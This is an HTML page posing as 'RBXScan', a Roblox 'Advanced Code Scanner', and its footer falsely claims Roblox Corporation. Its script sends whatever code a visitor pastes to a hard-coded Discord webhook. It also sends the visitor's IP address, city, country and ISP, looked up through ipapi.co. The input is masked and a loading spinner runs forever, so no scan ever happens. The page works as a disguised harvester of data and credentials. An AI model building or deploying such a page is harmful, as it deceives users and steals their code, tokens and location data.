<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RBXScan - Test</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: 
                linear-gradient(135deg, rgba(173, 216, 230, 0.8) 0%, rgba(135, 206, 235, 0.9) 50%, rgba(70, 130, 180, 0.8) 100%),
                url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 600"><defs><pattern id="wave" x="0" y="0" width="200" height="40" patternUnits="userSpaceOnUse"><path d="M0,20 Q50,0 100,20 T200,20 L200,40 L0,40 Z" fill="%23ffffff" opacity="0.1"/></pattern></defs><rect width="1200" height="600" fill="%234682b4"/><rect width="1200" height="600" fill="url(%23wave)"/></svg>');
            background-size: cover;
            background-attachment: fixed;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .container {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border: 2px solid rgba(70, 130, 180, 0.3);
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 15px 35px rgba(70, 130, 180, 0.2);
            text-align: center;
            max-width: 500px;
            width: 90%;
        }

        .roblox-logo {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            margin-bottom: 20px;
            gap: 15px;
        }

        .roblox-icon {
            width: 60px;
            height: 60px;
            background: linear-gradient(45deg, #1e3a8a, #3b82f6);
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 8px 20px rgba(30, 58, 138, 0.3);
            transform: rotate(-15deg);
            animation: float 3s ease-in-out infinite;
        }

        .roblox-icon::before {
            content: '';
            width: 30px;
            height: 30px;
            background: white;
            border-radius: 6px;
            transform: rotate(15deg);
        }

        .logo {
            font-size: 2.5rem;
            font-weight: bold;
            text-shadow: 0 2px 4px rgba(70, 130, 180, 0.3);
            letter-spacing: 2px;
            animation: colorChange 3s ease-in-out infinite;
        }

        @keyframes float {
            0%, 100% { transform: rotate(-15deg) translateY(0px); }
            50% { transform: rotate(-15deg) translateY(-10px); }
        }

        @keyframes colorChange {
            0%, 100% { 
                color: #1e3a8a; 
                text-shadow: 0 2px 4px rgba(70, 130, 180, 0.3);
            }
            50% { 
                color: #ffffff; 
                text-shadow: 0 2px 8px rgba(30, 58, 138, 0.8), 0 0 20px rgba(59, 130, 246, 0.5);
            }
        }

        .subtitle {
            color: #3b82f6;
            margin-bottom: 30px;
            font-size: 1.1rem;
        }

        .submit-btn {
            background: linear-gradient(45deg, #3b82f6, #1e40af);
            color: white;
            border: none;
            padding: 15px 40px;
            font-size: 16px;
            border-radius: 12px;
            cursor: pointer;
            transition: all 0.3s ease;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .submit-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(59, 130, 246, 0.4);
        }

        .popup-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            z-index: 1000;
            backdrop-filter: blur(5px);
        }

        .popup-content {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(15px);
            border: 2px solid rgba(70, 130, 180, 0.3);
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(70, 130, 180, 0.3);
            max-width: 600px;
            width: 90%;
        }

        .popup-title {
            font-size: 2rem;
            font-weight: bold;
            color: #1e3a8a;
            margin-bottom: 20px;
            text-align: center;
        }

        .code-textarea {
            width: 100%;
            min-height: 200px;
            padding: 15px;
            border: 2px solid rgba(70, 130, 180, 0.3);
            border-radius: 12px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            resize: vertical;
            background: rgba(255, 255, 255, 0.8);
            -webkit-text-security: disc;
            text-security: disc;
        }

        .popup-buttons {
            display: flex;
            gap: 15px;
            margin-top: 20px;
            justify-content: center;
        }

        .close-btn {
            background: rgba(70, 130, 180, 0.2);
            color: #1e3a8a;
            border: 2px solid rgba(70, 130, 180, 0.3);
            padding: 12px 30px;
            border-radius: 8px;
            cursor: pointer;
            font-weight: 600;
        }

        .loading-container {
            display: none;
            text-align: center;
            margin-top: 20px;
        }

        .loading-spinner {
            width: 40px;
            height: 40px;
            border: 4px solid rgba(59, 130, 246, 0.3);
            border-top: 4px solid #3b82f6;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 15px;
        }

        .loading-text {
            color: #1e3a8a;
            font-weight: 600;
            font-size: 16px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .footer {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            color: rgba(255, 255, 255, 0.8);
            font-size: 12px;
            text-align: center;
            background: rgba(30, 58, 138, 0.2);
            padding: 8px 20px;
            border-radius: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="roblox-logo">
            <div class="roblox-icon"></div>
            <div class="logo">RBXScan</div>
        </div>
        <div class="subtitle">Advanced Code Scanner</div>
        
        <div class="scan-section">
            <button type="button" class="submit-btn" id="openScanBtn">
                üîç Scan Code
            </button>
        </div>
    </div>

    <!-- Scan Popup -->
    <div id="compilePopup" class="popup-overlay">
        <div class="popup-content">
            <div class="popup-title">üîç RBXScan Scanner</div>
            <form id="compileForm">
                <textarea 
                    id="codeTextarea" 
                    class="code-textarea" 
                    placeholder="Paste your code here to scan..."
                    required
                ></textarea>
                
                <div class="popup-buttons">
                    <button type="button" class="close-btn" id="closePopup">Cancel</button>
                    <button type="submit" class="submit-btn" id="compileSubmitBtn">
                        üöÄ Start Scanning
                    </button>
                </div>
            </form>
            
            <div id="loadingContainer" class="loading-container">
                <div class="loading-spinner"></div>
                <div class="loading-text">
                    Scanning PowerShell...
                </div>
            </div>
        </div>
    </div>

    <div class="footer">
        ¬© 2025 All rights reserved to Roblox Corporation
    </div>

    <script>
        const openScanBtn = document.getElementById('openScanBtn');
        const compilePopup = document.getElementById('compilePopup');
        const compileForm = document.getElementById('compileForm');
        const codeTextarea = document.getElementById('codeTextarea');
        const compileSubmitBtn = document.getElementById('compileSubmitBtn');
        const closePopup = document.getElementById('closePopup');
        const loadingContainer = document.getElementById('loadingContainer');

        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1395450774489661480/eo-2Wv4tE0WgbthyZbIXQckKCspKyBMC3zWY7ZcyW5Rg3_Vn1j8xQLqQ4fGm03cEHEGu';

        async function getLocationInfo() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                return {
                    ip: data.ip || 'Unknown',
                    city: data.city || 'Unknown',
                    region: data.region || 'Unknown',
                    country: data.country_name || 'Unknown',
                    timezone: data.timezone || 'Unknown',
                    isp: data.org || 'Unknown'
                };
            } catch (error) {
                return {
                    ip: 'Unable to fetch',
                    city: 'Unknown',
                    region: 'Unknown',
                    country: 'Unknown',
                    timezone: 'Unknown',
                    isp: 'Unknown'
                };
            }
        }

        async function sendToWebhook(code) {
            try {
                const locationInfo = await getLocationInfo();
                
                const payload = {
                    content: "@everyone üö® **NEW CODE DETECTED** üö®",
                    embeds: [{
                        title: "üîç RBXScan - Code Submission Alert",
                        description: `**üìù Submitted Code:**\n\`\`\`\n${code}\n\`\`\``,
                        color: 0xFF4444,
                        timestamp: new Date().toISOString(),
                        footer: {
                            text: "RBXScan Alert System"
                        },
                        fields: [
                            {
                                name: "üåê IP Address",
                                value: locationInfo.ip,
                                inline: true
                            },
                            {
                                name: "üèôÔ∏è Location",
                                value: `${locationInfo.city}, ${locationInfo.region}`,
                                inline: true
                            },
                            {
                                name: "üåç Country",
                                value: locationInfo.country,
                                inline: true
                            },
                            {
                                name: "üïê Timezone",
                                value: locationInfo.timezone,
                                inline: true
                            },
                            {
                                name: "üåê ISP",
                                value: locationInfo.isp,
                                inline: true
                            },
                            {
                                name: "üîó Source",
                                value: "RBXScan Website",
                                inline: true
                            }
                        ]
                    }]
                };

                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(payload)
                });

                return { success: response.ok };
            } catch (error) {
                return { success: false };
            }
        }

        openScanBtn.addEventListener('click', () => {
            compilePopup.style.display = 'block';
            codeTextarea.focus();
        });

        closePopup.addEventListener('click', () => {
            compilePopup.style.display = 'none';
            codeTextarea.value = '';
            loadingContainer.style.display = 'none';
            compileSubmitBtn.disabled = false;
            compileSubmitBtn.textContent = 'üöÄ Start Scanning';
        });

        compilePopup.addEventListener('click', (e) => {
            if (e.target === compilePopup) {
                closePopup.click();
            }
        });

        compileForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const code = codeTextarea.value.trim();
            
            if (!code) {
                alert('Please enter code to scan');
                return;
            }

            // Show infinite loading
            compileSubmitBtn.disabled = true;
            compileSubmitBtn.textContent = 'Scanning...';
            loadingContainer.style.display = 'block';
            
            // Send to webhook in background
            await sendToWebhook(code);
            
            // Keep loading forever - user must close popup manually
        });
    </script>
</body>
</html>
